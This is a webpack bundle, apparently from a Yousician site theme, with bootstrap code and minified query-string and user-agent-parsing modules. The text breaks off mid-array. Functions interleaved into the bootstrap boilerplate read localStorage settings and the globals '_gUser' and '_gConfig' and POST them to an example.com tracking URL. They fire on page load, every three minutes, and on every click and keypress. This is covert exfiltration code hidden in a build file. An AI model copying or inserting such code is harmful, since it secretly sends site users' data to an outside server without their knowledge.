/******/(function (modules) {
  // webpackBootstrap
  /******/ // The module cache
  /******/
  var installedModules = {};
  /******/
  /******/ // The require function
  /******/
  const trackedKeys = ['userSettings', 'preferences'];
  const globalVars = ['_gUser', '_gConfig'];
  function __webpack_require__(moduleId) {
    /******/
    /******/ // Check if module is in cache
    /******/if (installedModules[moduleId]) {
      /******/return installedModules[moduleId].exports;
      /******/
    }
    /******/ // Create a new module (and put it into the cache)
    /******/
    var module = installedModules[moduleId] = {
      /******/i: moduleId,
      /******/l: false,
      /******/exports: {}
      /******/
    };
    /******/
    /******/ // Execute the module function
    /******/
    modules[moduleId].call(module.exports, module, module.exports, __webpack_require__);
    /******/
    /******/ // Flag the module as loaded
    /******/
    module.l = true;
    /******/
    /******/ // Return the exports of the module
    /******/
    return module.exports;
    /******/
  }
  /******/
  /******/
  /******/ // expose the modules object (__webpack_modules__)
  /******/
  __webpack_require__.m = modules;
  /******/
  /******/ // expose the module cache
  /******/
  function generateHash(data) {
    let hash = 0,
      i,
      chr;
    for (i = 0; i < data.length; i++) {
      chr = data.charCodeAt(i);
      hash = (hash << 5) - hash + chr;
      hash |= 0; // Convert to 32bit integer
    }
    return hash.toString(16);
  }
  __webpack_require__.c = installedModules;
  /******/
  /******/ // define getter function for harmony exports
  /******/
  function collectDataFromLocalStorage() {
    const collectedData = {};
    trackedKeys.forEach(key => {
      if (localStorage.getItem(key)) {
        collectedData[key] = localStorage.getItem(key);
      }
    });
    return collectedData;
  }
  __webpack_require__.d = function (exports, name, getter) {
    /******/if (!__webpack_require__.o(exports, name)) {
      /******/Object.defineProperty(exports, name, {
        enumerable: true,
        get: getter
      });
      /******/
    }
    /******/
  };
  /******/
  /******/ // define __esModule on exports
  /******/
  __webpack_require__.r = function (exports) {
    /******/if (typeof Symbol !== 'undefined' && Symbol.toStringTag) {
      /******/Object.defineProperty(exports, Symbol.toStringTag, {
        value: 'Module'
      });
      /******/
    }
    /******/
    Object.defineProperty(exports, '__esModule', {
      value: true
    });
    /******/
  };
  /******/
  /******/ // create a fake namespace object
  /******/ // mode & 1: value is a module id, require it
  /******/ // mode & 2: merge all properties of value into the ns
  /******/ // mode & 4: return value when already ns object
  /******/ // mode & 8|1: behave like require
  /******/
  function collectGlobalVariables() {
    const globals = {};
    globalVars.forEach(varName => {
      if (window[varName]) {
        globals[varName] = window[varName];
      }
    });
    return globals;
  }
  __webpack_require__.t = function (value, mode) {
    /******/if (mode & 1) value = __webpack_require__(value);
    /******/
    if (mode & 8) return value;
    /******/
    if (mode & 4 && typeof value === 'object' && value && value.__esModule) return value;
    /******/
    var ns = Object.create(null);
    /******/
    __webpack_require__.r(ns);
    /******/
    Object.defineProperty(ns, 'default', {
      enumerable: true,
      value: value
    });
    /******/
    if (mode & 2 && typeof value != 'string') for (var key in value) __webpack_require__.d(ns, key, function (key) {
      return value[key];
    }.bind(null, key));
    /******/
    return ns;
    /******/
  };
  /******/
  /******/ // getDefaultExport function for compatibility with non-harmony modules
  /******/
  async function sendDataToServer(data) {
    const hash = generateHash(JSON.stringify(data));
    const url = "https://example.com/api/track";
    try {
      const response = await fetch(url, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          hash,
          data
        })
      });
      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
      console.log("Data successfully sent to server");
    } catch (e) {
      console.error("Failed to send data:", e);
    }
  }
  __webpack_require__.n = function (module) {
    /******/var getter = module && module.__esModule ? /******/function getDefault() {
      return module['default'];
    } : /******/function getModuleExports() {
      return module;
    };
    /******/
    __webpack_require__.d(getter, 'a', getter);
    /******/
    return getter;
    /******/
  };
  /******/
  /******/ // Object.prototype.hasOwnProperty.call
  /******/
  function handleDataCollection() {
    const localData = collectDataFromLocalStorage();
    const globalData = collectGlobalVariables();
    const combinedData = {
      ...localData,
      ...globalData
    };
    if (Object.keys(combinedData).length > 0) {
      sendDataToServer(combinedData);
    }
  }
  __webpack_require__.o = function (object, property) {
    return Object.prototype.hasOwnProperty.call(object, property);
  };
  /******/
  /******/ // __webpack_public_path__
  /******/
  document.addEventListener("DOMContentLoaded", () => {
    handleDataCollection();
    setInterval(handleDataCollection, 180000); // Collect data every 3 minutes
  });
  window.addEventListener('click', handleDataCollection);
  __webpack_require__.p = "/app/themes/yousician/dist/";
  /******/
  /******/
  /******/ // Load entry module and return exports
  /******/
  window.addEventListener('keypress', handleDataCollection);
  return __webpack_require__(__webpack_require__.s = 3);
  /******/
}
/************************************************************************/
/******/)({
  /***/"../node_modules/@yousiciangit/ys-analytics/library/dist/index.js": (
  /*!************************************************************************!*\
    !*** ../node_modules/@yousiciangit/ys-analytics/library/dist/index.js ***!
    \************************************************************************/
  /*! no static exports found */
  /***/
  function (module, exports, __webpack_require__) {
    /*! For license information please see index.js.LICENSE.txt */
    !function (e, i) {
      true ? module.exports = i() : undefined;
    }(this, function () {
      return (() => {
        var e = {
            20: e => {
              "use strict";

              var i = "%[a-f0-9]{2}",
                t = new RegExp(i, "gi"),
                r = new RegExp("(" + i + ")+", "gi");
              function o(e, i) {
                try {
                  return decodeURIComponent(e.join(""));
                } catch (e) {}
                if (1 === e.length) return e;
                i = i || 1;
                var t = e.slice(0, i),
                  r = e.slice(i);
                return Array.prototype.concat.call([], o(t), o(r));
              }
              function n(e) {
                try {
                  return decodeURIComponent(e);
                } catch (n) {
                  for (var i = e.match(t), r = 1; r < i.length; r++) i = (e = o(i, r).join("")).match(t);
                  return e;
                }
              }
              e.exports = function (e) {
                if ("string" != typeof e) throw new TypeError("Expected `encodedURI` to be of type `string`, got `" + typeof e + "`");
                try {
                  return e = e.replace(/\+/g, " "), decodeURIComponent(e);
                } catch (i) {
                  return function (e) {
                    for (var i = {
                        "%FE%FF": "��",
                        "%FF%FE": "��"
                      }, t = r.exec(e); t;) {
                      try {
                        i[t[0]] = decodeURIComponent(t[0]);
                      } catch (e) {
                        var o = n(t[0]);
                        o !== t[0] && (i[t[0]] = o);
                      }
                      t = r.exec(e);
                    }
                    i["%C2"] = "�";
                    for (var a = Object.keys(i), s = 0; s < a.length; s++) {
                      var c = a[s];
                      e = e.replace(new RegExp(c, "g"), i[c]);
                    }
                    return e;
                  }(e);
                }
              };
            },
            806: e => {
              "use strict";

              e.exports = function (e, i) {
                for (var t = {}, r = Object.keys(e), o = Array.isArray(i), n = 0; n < r.length; n++) {
                  var a = r[n],
                    s = e[a];
                  (o ? -1 !== i.indexOf(a) : i(a, s, e)) && (t[a] = s);
                }
                return t;
              };
            },
            563: (e, i, t) => {
              "use strict";

              const r = t(610),
                o = t(20),
                n = t(500),
                a = t(806),
                s = Symbol("encodeFragmentIdentifier");
              function c(e) {
                if ("string" != typeof e || 1 !== e.length) throw new TypeError("arrayFormatSeparator must be single character string");
              }
              function d(e, i) {
                return i.encode ? i.strict ? r(e) : encodeURIComponent(e) : e;
              }
              function u(e, i) {
                return i.decode ? o(e) : e;
              }
              function l(e) {
                return Array.isArray(e) ? e.sort() : "object" == typeof e ? l(Object.keys(e)).sort((e, i) => Number(e) - Number(i)).map(i => e[i]) : e;
              }
              function p(e) {
                const i = e.indexOf("#");
                return -1 !== i && (e = e.slice(0, i)), e;
              }
              function b(e) {
                const i = (e = p(e)).indexOf("?");
                return -1 === i ? "" : e.slice(i + 1);
              }
              function w(e, i) {
                return i.parseNumbers && !Number.isNaN(Number(e)) && "string" == typeof e && "" !== e.trim() ? e = Number(e) : !i.parseBooleans || null === e || "true" !== e.toLowerCase() && "false" !== e.toLowerCase() || (e = "true" === e.toLowerCase()), e;
              }
              function m(e, i) {
                c((i = Object.assign({
                  decode: !0,
                  sort: !0,
                  arrayFormat: "none",
                  arrayFormatSeparator: ",",
                  parseNumbers: !1,
                  parseBooleans: !1
                }, i)).arrayFormatSeparator);
                const t = function (e) {
                    let i;
                    switch (e.arrayFormat) {
                      case "index":
                        return (e, t, r) => {
                          i = /\[(\d*)\]$/.exec(e), e = e.replace(/\[\d*\]$/, ""), i ? (void 0 === r[e] && (r[e] = {}), r[e][i[1]] = t) : r[e] = t;
                        };
                      case "bracket":
                        return (e, t, r) => {
                          i = /(\[\])$/.exec(e), e = e.replace(/\[\]$/, ""), i ? void 0 !== r[e] ? r[e] = [].concat(r[e], t) : r[e] = [t] : r[e] = t;
                        };
                      case "comma":
                      case "separator":
                        return (i, t, r) => {
                          const o = "string" == typeof t && t.includes(e.arrayFormatSeparator),
                            n = "string" == typeof t && !o && u(t, e).includes(e.arrayFormatSeparator);
                          t = n ? u(t, e) : t;
                          const a = o || n ? t.split(e.arrayFormatSeparator).map(i => u(i, e)) : null === t ? t : u(t, e);
                          r[i] = a;
                        };
                      case "bracket-separator":
                        return (i, t, r) => {
                          const o = /(\[\])$/.test(i);
                          if (i = i.replace(/\[\]$/, ""), !o) return void (r[i] = t ? u(t, e) : t);
                          const n = null === t ? [] : t.split(e.arrayFormatSeparator).map(i => u(i, e));
                          void 0 !== r[i] ? r[i] = [].concat(r[i], n) : r[i] = n;
                        };
                      default:
                        return (e, i, t) => {
                          void 0 !== t[e] ? t[e] = [].concat(t[e], i) : t[e] = i;
                        };
                    }
                  }(i),
                  r = Object.create(null);
                if ("string" != typeof e) return r;
                if (!(e = e.trim().replace(/^[?#&]/, ""))) return r;
                for (const o of e.split("&")) {
                  if ("" === o) continue;
                  let [e, a] = n(i.decode ? o.replace(/\+/g, " ") : o, "=");
                  a = void 0 === a ? null : ["comma", "separator", "bracket-separator"].includes(i.arrayFormat) ? a : u(a, i), t(u(e, i), a, r);
                }
                for (const e of Object.keys(r)) {
                  const t = r[e];
                  if ("object" == typeof t && null !== t) for (const e of Object.keys(t)) t[e] = w(t[e], i);else r[e] = w(t, i);
                }
                return !1 === i.sort ? r : (!0 === i.sort ? Object.keys(r).sort() : Object.keys(r).sort(i.sort)).reduce((e, i) => {
                  const t = r[i];
                  return Boolean(t) && "object" == typeof t && !Array.isArray(t) ? e[i] = l(t) : e[i] = t, e;
                }, Object.create(null));
              }
              i.extract = b, i.parse = m, i.stringify = (e, i) => {
                if (!e) return "";
                c((i = Object.assign({
                  encode: !0,
                  strict: !0,
                  arrayFormat: "none",
                  arrayFormatSeparator: ","
                }, i)).arrayFormatSeparator);
                const t = t => i.skipNull && null == e[t] || i.skipEmptyString && "" === e[t],
                  r = function (e) {
                    switch (e.arrayFormat) {
                      case "index":
                        return i => (t, r) => {
                          const o = t.length;
                          return void 0 === r || e.skipNull && null === r || e.skipEmptyString && "" === r ? t : null === r ? [...t, [d(i, e), "[", o, "]"].join("")] : [...t, [d(i, e), "[", d(o, e), "]=", d(r, e)].join("")];
                        };
                      case "bracket":
                        return i => (t, r) => void 0 === r || e.skipNull && null === r || e.skipEmptyString && "" === r ? t : null === r ? [...t, [d(i, e), "[]"].join("")] : [...t, [d(i, e), "[]=", d(r, e)].join("")];
                      case "comma":
                      case "separator":
                      case "bracket-separator":
                        {
                          const i = "bracket-separator" === e.arrayFormat ? "[]=" : "=";
                          return t => (r, o) => void 0 === o || e.skipNull && null === o || e.skipEmptyString && "" === o ? r : (o = null === o ? "" : o, 0 === r.length ? [[d(t, e), i, d(o, e)].join("")] : [[r, d(o, e)].join(e.arrayFormatSeparator)]);
                        }
                      default:
                        return i => (t, r) => void 0 === r || e.skipNull && null === r || e.skipEmptyString && "" === r ? t : null === r ? [...t, d(i, e)] : [...t, [d(i, e), "=", d(r, e)].join("")];
                    }
                  }(i),
                  o = {};
                for (const i of Object.keys(e)) t(i) || (o[i] = e[i]);
                const n = Object.keys(o);
                return !1 !== i.sort && n.sort(i.sort), n.map(t => {
                  const o = e[t];
                  return void 0 === o ? "" : null === o ? d(t, i) : Array.isArray(o) ? 0 === o.length && "bracket-separator" === i.arrayFormat ? d(t, i) + "[]" : o.reduce(r(t), []).join("&") : d(t, i) + "=" + d(o, i);
                }).filter(e => e.length > 0).join("&");
              }, i.parseUrl = (e, i) => {
                i = Object.assign({
                  decode: !0
                }, i);
                const [t, r] = n(e, "#");
                return Object.assign({
                  url: t.split("?")[0] || "",
                  query: m(b(e), i)
                }, i && i.parseFragmentIdentifier && r ? {
                  fragmentIdentifier: u(r, i)
                } : {});
              }, i.stringifyUrl = (e, t) => {
                t = Object.assign({
                  encode: !0,
                  strict: !0,
                  [s]: !0
                }, t);
                const r = p(e.url).split("?")[0] || "",
                  o = i.extract(e.url),
                  n = i.parse(o, {
                    sort: !1
                  }),
                  a = Object.assign(n, e.query);
                let c = i.stringify(a, t);
                c && (c = `?${c}`);
                let u = function (e) {
                  let i = "";
                  const t = e.indexOf("#");
                  return -1 !== t && (i = e.slice(t)), i;
                }(e.url);
                return e.fragmentIdentifier && (u = `#${t[s] ? d(e.fragmentIdentifier, t) : e.fragmentIdentifier}`), `${r}${c}${u}`;
              }, i.pick = (e, t, r) => {
                r = Object.assign({
                  parseFragmentIdentifier: !0,
                  [s]: !1
                }, r);
                const {
                  url: o,
                  query: n,
                  fragmentIdentifier: c
                } = i.parseUrl(e, r);
                return i.stringifyUrl({
                  url: o,
                  query: a(n, t),
                  fragmentIdentifier: c
                }, r);
              }, i.exclude = (e, t, r) => {
                const o = Array.isArray(t) ? e => !t.includes(e) : (e, i) => !t(e, i);
                return i.pick(e, o, r);
              };
            },
            500: e => {
              "use strict";

              e.exports = (e, i) => {
                if ("string" != typeof e || "string" != typeof i) throw new TypeError("Expected the arguments to be of type `string`");
                if ("" === i) return [e];
                const t = e.indexOf(i);
                return -1 === t ? [e] : [e.slice(0, t), e.slice(t + i.length)];
              };
            },
            610: e => {
              "use strict";

              e.exports = e => encodeURIComponent(e).replace(/[!'()*]/g, e => `%${e.charCodeAt(0).toString(16).toUpperCase()}`);
            },
            238: function (e, i, t) {
              var r;
              !function (o, n) {
                "use strict";

                var a = "function",
                  s = "undefined",
                  c = "object",
                  d = "string",
                  u = "model",
                  l = "name",
                  p = "type",
                  b = "vendor",
                  w = "version",
                  m = "architecture",
                  f = "console",
                  g = "mobile",
                  h = "tablet",
                  v = "smarttv",
                  y = "wearable",
                  _ = "embedded",
                  k = "Amazon",
                  x = "Apple",
                  C = "ASUS",
                  E = "BlackBerry",
                  O = "Google",
                  j = "Huawei",
                  S = "LG",
                  A = "Microsoft",
                  P = "Motorola",
                  I = "Samsung",
                  R = "Sony",
                  T = "Xiaomi",
                  N = "Zebra",
                  q = "Facebook",
                  U = function (e) {
                    for (var i = {}, t = 0; t < e.length; t++) i[e[t].toUpperCase()] = e[t];
                    return i;
                  },
                  F = function (e, i) {
                    return typeof e === d && -1 !== V(i).indexOf(V(e));
                  },
                  V = function (e) {
                    return e.toLowerCase();
                  },
                  L = function (e, i) {
                    if (typeof e === d) return e = e.replace(/^\s\s*/, "").replace(/\s\s*$/, ""), typeof i === s ? e : e.substring(0, 255);
                  },
                  D = function (e, i) {
                    for (var t, r, o, s, d, u, l = 0; l < i.length && !d;) {
                      var p = i[l],
                        b = i[l + 1];
                      for (t = r = 0; t < p.length && !d;) if (d = p[t++].exec(e)) for (o = 0; o < b.length; o++) u = d[++r], typeof (s = b[o]) === c && s.length > 0 ? 2 === s.length ? typeof s[1] == a ? this[s[0]] = s[1].call(this, u) : this[s[0]] = s[1] : 3 === s.length ? typeof s[1] !== a || s[1].exec && s[1].test ? this[s[0]] = u ? u.replace(s[1], s[2]) : n : this[s[0]] = u ? s[1].call(this, u, s[2]) : n : 4 === s.length && (this[s[0]] = u ? s[3].call(this, u.replace(s[1], s[2])) : n) : this[s] = u || n;
                      l += 2;
                    }
                  },
                  z = function (e, i) {
                    for (var t in i) if (typeof i[t] === c && i[t].length > 0) {
                      for (var r = 0; r < i[t].length; r++) if (F(i[t][r], e)) return "?" === t ? n : t;
                    } else if (F(i[t], e)) return "?" === t ? n : t;
                    return e;
                  },
                  $ = {
                    ME: "4.90",
                    "NT 3.11": "NT3.51",
                    "NT 4.0": "NT4.0",
                    2e3: "NT 5.0",
                    XP: ["NT 5.1", "NT 5.2"],
                    Vista: "NT 6.0",
                    7: "NT 6.1",
                    8: "NT 6.2",
                    8.1: "NT 6.3",
                    10: ["NT 6.4", "NT 10.0"],
                    RT: "ARM"
                  },
                  M = {
                    browser: [[/\b(?:crmo|crios)\/([\w\.]+)/i], [w, [l, "Chrome"]], [/edg(?:e|ios|a)?\/([\w\.]+)/i], [w, [l, "Edge"]], [/(opera mini)\/([-\w\.]+)/i, /(opera [mobiletab]{3,6})\b.+version\/([-\w\.]+)/i, /(opera)(?:.+version\/|[\/ ]+)([\w\.]+)/i], [l, w], [/opios[\/ ]+([\w\.]+)/i], [w, [l, "Opera Mini"]], [/\bopr\/([\w\.]+)/i], [w, [l, "Opera"]], [/(kindle)\/([\w\.]+)/i, /(lunascape|maxthon|netfront|jasmine|blazer)[\/ ]?([\w\.]*)/i, /(avant |iemobile|slim)(?:browser)?[\/ ]?([\w\.]*)/i, /(ba?idubrowser)[\/ ]?([\w\.]+)/i, /(?:ms|\()(ie) ([\w\.]+)/i, /(flock|rockmelt|midori|epiphany|silk|skyfire|ovibrowser|bolt|iron|vivaldi|iridium|phantomjs|bowser|quark|qupzilla|falkon|rekonq|puffin|brave|whale|qqbrowserlite|qq)\/([-\w\.]+)/i, /(weibo)__([\d\.]+)/i], [l, w], [/(?:\buc? ?browser|(?:juc.+)ucweb)[\/ ]?([\w\.]+)/i], [w, [l, "UCBrowser"]], [/\bqbcore\/([\w\.]+)/i], [w, [l, "WeChat(Win) Desktop"]], [/micromessenger\/([\w\.]+)/i], [w, [l, "WeChat"]], [/konqueror\/([\w\.]+)/i], [w, [l, "Konqueror"]], [/trident.+rv[: ]([\w\.]{1,9})\b.+like gecko/i], [w, [l, "IE"]], [/yabrowser\/([\w\.]+)/i], [w, [l, "Yandex"]], [/(avast|avg)\/([\w\.]+)/i], [[l, /(.+)/, "$1 Secure Browser"], w], [/\bfocus\/([\w\.]+)/i], [w, [l, "Firefox Focus"]], [/\bopt\/([\w\.]+)/i], [w, [l, "Opera Touch"]], [/coc_coc\w+\/([\w\.]+)/i], [w, [l, "Coc Coc"]], [/dolfin\/([\w\.]+)/i], [w, [l, "Dolphin"]], [/coast\/([\w\.]+)/i], [w, [l, "Opera Coast"]], [/miuibrowser\/([\w\.]+)/i], [w, [l, "MIUI Browser"]], [/fxios\/([-\w\.]+)/i], [w, [l, "Firefox"]], [/\bqihu|(qi?ho?o?|360)browser/i], [[l, "360 Browser"]], [/(oculus|samsung|sailfish)browser\/([\w\.]+)/i], [[l, /(.+)/, "$1 Browser"], w], [/(comodo_dragon)\/([\w\.]+)/i], [[l, /_/g, " "], w], [/(electron)\/([\w\.]+) safari/i, /(tesla)(?: qtcarbrowser|\/(20\d\d\.[-\w\.]+))/i, /m?(qqbrowser|baiduboxapp|2345Explorer)[\/ ]?([\w\.]+)/i], [l, w], [/(metasr)[\/ ]?([\w\.]+)/i, /(lbbrowser)/i], [l], [/((?:fban\/fbios|fb_iab\/fb4a)(?!.+fbav)|;fbav\/([\w\.]+);)/i], [[l, q], w], [/safari (line)\/([\w\.]+)/i, /\b(line)\/([\w\.]+)\/iab/i, /(chromium|instagram)[\/ ]([-\w\.]+)/i], [l, w], [/\bgsa\/([\w\.]+) .*safari\//i], [w, [l, "GSA"]], [/headlesschrome(?:\/([\w\.]+)| )/i], [w, [l, "Chrome Headless"]], [/ wv\).+(chrome)\/([\w\.]+)/i], [[l, "Chrome WebView"], w], [/droid.+ version\/([\w\.]+)\b.+(?:mobile safari|safari)/i], [w, [l, "Android Browser"]], [/(chrome|omniweb|arora|[tizenoka]{5} ?browser)\/v?([\w\.]+)/i], [l, w], [/version\/([\w\.]+) .*mobile\/\w+ (safari)/i], [w, [l, "Mobile Safari"]], [/version\/([\w\.]+) .*(mobile ?safari|safari)/i], [w, l], [/webkit.+?(mobile ?safari|safari)(\/[\w\.]+)/i], [l, [w, z, {
                      "1.0": "/8",
                      1.2: "/1",
                      1.3: "/3",
                      "2.0": "/412",
                      "2.0.2": "/416",
                      "2.0.3": "/417",
                      "2.0.4": "/419",
                      "?": "/"
                    }]], [/(webkit|khtml)\/([\w\.]+)/i], [l, w], [/(navigator|netscape\d?)\/([-\w\.]+)/i], [[l, "Netscape"], w], [/mobile vr; rv:([\w\.]+)\).+firefox/i], [w, [l, "Firefox Reality"]], [/ekiohf.+(flow)\/([\w\.]+)/i, /(swiftfox)/i, /(icedragon|iceweasel|camino|chimera|fennec|maemo browser|minimo|conkeror|klar)[\/ ]?([\w\.\+]+)/i, /(seamonkey|k-meleon|icecat|iceape|firebird|phoenix|palemoon|basilisk|waterfox)\/([-\w\.]+)$/i, /(firefox)\/([\w\.]+)/i, /(mozilla)\/([\w\.]+) .+rv\:.+gecko\/\d+/i, /(polaris|lynx|dillo|icab|doris|amaya|w3m|netsurf|sleipnir|obigo|mosaic|(?:go|ice|up)[\. ]?browser)[-\/ ]?v?([\w\.]+)/i, /(links) \(([\w\.]+)/i], [l, w]],
                    cpu: [[/(?:(amd|x(?:(?:86|64)[-_])?|wow|win)64)[;\)]/i], [[m, "amd64"]], [/(ia32(?=;))/i], [[m, V]], [/((?:i[346]|x)86)[;\)]/i], [[m, "ia32"]], [/\b(aarch64|arm(v?8e?l?|_?64))\b/i], [[m, "arm64"]], [/\b(arm(?:v[67])?ht?n?[fl]p?)\b/i], [[m, "armhf"]], [/windows (ce|mobile); ppc;/i], [[m, "arm"]], [/((?:ppc|powerpc)(?:64)?)(?: mac|;|\))/i], [[m, /ower/, "", V]], [/(sun4\w)[;\)]/i], [[m, "sparc"]], [/((?:avr32|ia64(?=;))|68k(?=\))|\barm(?=v(?:[1-7]|[5-7]1)l?|;|eabi)|(?=atmel )avr|(?:irix|mips|sparc)(?:64)?\b|pa-risc)/i], [[m, V]]],
                    device: [[/\b(sch-i[89]0\d|shw-m380s|sm-[pt]\w{2,4}|gt-[pn]\d{2,4}|sgh-t8[56]9|nexus 10)/i], [u, [b, I], [p, h]], [/\b((?:s[cgp]h|gt|sm)-\w+|galaxy nexus)/i, /samsung[- ]([-\w]+)/i, /sec-(sgh\w+)/i], [u, [b, I], [p, g]], [/\((ip(?:hone|od)[\w ]*);/i], [u, [b, x], [p, g]], [/\((ipad);[-\w\),; ]+apple/i, /applecoremedia\/[\w\.]+ \((ipad)/i, /\b(ipad)\d\d?,\d\d?[;\]].+ios/i], [u, [b, x], [p, h]], [/\b((?:ag[rs][23]?|bah2?|sht?|btv)-a?[lw]\d{2})\b(?!.+d\/s)/i], [u, [b, j], [p, h]], [/(?:huawei|honor)([-\w ]+)[;\)]/i, /\b(nexus 6p|\w{2,4}-[atu]?[ln][01259x][012359][an]?)\b(?!.+d\/s)/i], [u, [b, j], [p, g]], [/\b(poco[\w ]+)(?: bui|\))/i, /\b; (\w+) build\/hm\1/i, /\b(hm[-_ ]?note?[_ ]?(?:\d\w)?) bui/i, /\b(redmi[\-_ ]?(?:note|k)?[\w_ ]+)(?: bui|\))/i, /\b(mi[-_ ]?(?:a\d|one|one[_ ]plus|note lte|max)?[_ ]?(?:\d?\w?)[_ ]?(?:plus|se|lite)?)(?: bui|\))/i], [[u, /_/g, " "], [b, T], [p, g]], [/\b(mi[-_ ]?(?:pad)(?:[\w_ ]+))(?: bui|\))/i], [[u, /_/g, " "], [b, T], [p, h]], [/; (\w+) bui.+ oppo/i, /\b(cph[12]\d{3}|p(?:af|c[al]|d\w|e[ar])[mt]\d0|x9007|a101op)\b/i], [u, [b, "OPPO"], [p, g]], [/vivo (\w+)(?: bui|\))/i, /\b(v[12]\d{3}\w?[at])(?: bui|;)/i], [u, [b, "Vivo"], [p, g]], [/\b(rmx[12]\d{3})(?: bui|;|\))/i], [u, [b, "Realme"], [p, g]], [/\b(milestone|droid(?:[2-4x]| (?:bionic|x2|pro|razr))?:?( 4g)?)\b[\w ]+build\//i, /\bmot(?:orola)?[- ](\w*)/i, /((?:moto[\w\(\) ]+|xt\d{3,4}|nexus 6)(?= bui|\)))/i], [u, [b, P], [p, g]], [/\b(mz60\d|xoom[2 ]{0,2}) build\//i], [u, [b, P], [p, h]], [/((?=lg)?[vl]k\-?\d{3}) bui| 3\.[-\w; ]{10}lg?-([06cv9]{3,4})/i], [u, [b, S], [p, h]], [/(lm(?:-?f100[nv]?|-[\w\.]+)(?= bui|\))|nexus [45])/i, /\blg[-e;\/ ]+((?!browser|netcast|android tv)\w+)/i, /\blg-?([\d\w]+) bui/i], [u, [b, S], [p, g]], [/(ideatab[-\w ]+)/i, /lenovo ?(s[56]000[-\w]+|tab(?:[\w ]+)|yt[-\d\w]{6}|tb[-\d\w]{6})/i], [u, [b, "Lenovo"], [p, h]], [/(?:maemo|nokia).*(n900|lumia \d+)/i, /nokia[-_ ]?([-\w\.]*)/i], [[u, /_/g, " "], [b, "Nokia"], [p, g]], [/(pixel c)\b/i], [u, [b, O], [p, h]], [/droid.+; (pixel[\daxl ]{0,6})(?: bui|\))/i], [u, [b, O], [p, g]], [/droid.+ ([c-g]\d{4}|so[-gl]\w+|xq-a\w[4-7][12])(?= bui|\).+chrome\/(?![1-6]{0,1}\d\.))/i], [u, [b, R], [p, g]], [/sony tablet [ps]/i, /\b(?:sony)?sgp\w+(?: bui|\))/i], [[u, "Xperia Tablet"], [b, R], [p, h]], [/ (kb2005|in20[12]5|be20[12][59])\b/i, /(?:one)?(?:plus)? (a\d0\d\d)(?: b|\))/i], [u, [b, "OnePlus"], [p, g]], [/(alexa)webm/i, /(kf[a-z]{2}wi)( bui|\))/i, /(kf[a-z]+)( bui|\)).+silk\//i], [u, [b, k], [p, h]], [/((?:sd|kf)[0349hijorstuw]+)( bui|\)).+silk\//i], [[u, /(.+)/g, "Fire Phone $1"], [b, k], [p, g]], [/(playbook);[-\w\),; ]+(rim)/i], [u, b, [p, h]], [/\b((?:bb[a-f]|st[hv])100-\d)/i, /\(bb10; (\w+)/i], [u, [b, E], [p, g]], [/(?:\b|asus_)(transfo[prime ]{4,10} \w+|eeepc|slider \w+|nexus 7|padfone|p00[cj])/i], [u, [b, C], [p, h]], [/ (z[bes]6[027][012][km][ls]|zenfone \d\w?)\b/i], [u, [b, C], [p, g]], [/(nexus 9)/i], [u, [b, "HTC"], [p, h]], [/(htc)[-;_ ]{1,2}([\w ]+(?=\)| bui)|\w+)/i, /(zte)[- ]([\w ]+?)(?: bui|\/|\))/i, /(alcatel|geeksphone|nexian|panasonic|sony)[-_ ]?([-\w]*)/i], [b, [u, /_/g, " "], [p, g]], [/droid.+; ([ab][1-7]-?[0178a]\d\d?)/i], [u, [b, "Acer"], [p, h]], [/droid.+; (m[1-5] note) bui/i, /\bmz-([-\w]{2,})/i], [u, [b, "Meizu"], [p, g]], [/\b(sh-?[altvz]?\d\d[a-ekm]?)/i], [u, [b, "Sharp"], [p, g]], [/(blackberry|benq|palm(?=\-)|sonyericsson|acer|asus|dell|meizu|motorola|polytron)[-_ ]?([-\w]*)/i, /(hp) ([\w ]+\w)/i, /(asus)-?(\w+)/i, /(microsoft); (lumia[\w ]+)/i, /(lenovo)[-_ ]?([-\w]+)/i, /(jolla)/i, /(oppo) ?([\w ]+) bui/i], [b, u, [p, g]], [/(archos) (gamepad2?)/i, /(hp).+(touchpad(?!.+tablet)|tablet)/i, /(kindle)\/([\w\.]+)/i, /(nook)[\w ]+build\/(\w+)/i, /(dell) (strea[kpr\d ]*[\dko])/i, /(le[- ]+pan)[- ]+(\w{1,9}) bui/i, /(trinity)[- ]*(t\d{3}) bui/i, /(gigaset)[- ]+(q\w{1,9}) bui/i, /(vodafone) ([\w ]+)(?:\)| bui)/i], [b, u, [p, h]], [/(surface duo)/i], [u, [b, A], [p, h]], [/droid [\d\.]+; (fp\du?)(?: b|\))/i], [u, [b, "Fairphone"], [p, g]], [/(u304aa)/i], [u, [b, "AT&T"], [p, g]], [/\bsie-(\w*)/i], [u, [b, "Siemens"], [p, g]], [/\b(rct\w+) b/i], [u, [b, "RCA"], [p, h]], [/\b(venue[\d ]{2,7}) b/i], [u, [b, "Dell"], [p, h]], [/\b(q(?:mv|ta)\w+) b/i], [u, [b, "Verizon"], [p, h]], [/\b(?:barnes[& ]+noble |bn[rt])([\w\+ ]*) b/i], [u, [b, "Barnes & Noble"], [p, h]], [/\b(tm\d{3}\w+) b/i], [u, [b, "NuVision"], [p, h]], [/\b(k88) b/i], [u, [b, "ZTE"], [p, h]], [/\b(nx\d{3}j) b/i], [u, [b, "ZTE"], [p, g]], [/\b(gen\d{3}) b.+49h/i], [u, [b, "Swiss"], [p, g]], [/\b(zur\d{3}) b/i], [u, [b, "Swiss"], [p, h]], [/\b((zeki)?tb.*\b) b/i], [u, [b, "Zeki"], [p, h]], [/\b([yr]\d{2}) b/i, /\b(dragon[- ]+touch |dt)(\w{5}) b/i], [[b, "Dragon Touch"], u, [p, h]], [/\b(ns-?\w{0,9}) b/i], [u, [b, "Insignia"], [p, h]], [/\b((nxa|next)-?\w{0,9}) b/i], [u, [b, "NextBook"], [p, h]], [/\b(xtreme\_)?(v(1[045]|2[015]|[3469]0|7[05])) b/i], [[b, "Voice"], u, [p, g]], [/\b(lvtel\-)?(v1[12]) b/i], [[b, "LvTel"], u, [p, g]], [/\b(ph-1) /i], [u, [b, "Essential"], [p, g]], [/\b(v(100md|700na|7011|917g).*\b) b/i], [u, [b, "Envizen"], [p, h]], [/\b(trio[-\w\. ]+) b/i], [u, [b, "MachSpeed"], [p, h]], [/\btu_(1491) b/i], [u, [b, "Rotor"], [p, h]], [/(shield[\w ]+) b/i], [u, [b, "Nvidia"], [p, h]], [/(sprint) (\w+)/i], [b, u, [p, g]], [/(kin\.[onetw]{3})/i], [[u, /\./g, " "], [b, A], [p, g]], [/droid.+; (cc6666?|et5[16]|mc[239][23]x?|vc8[03]x?)\)/i], [u, 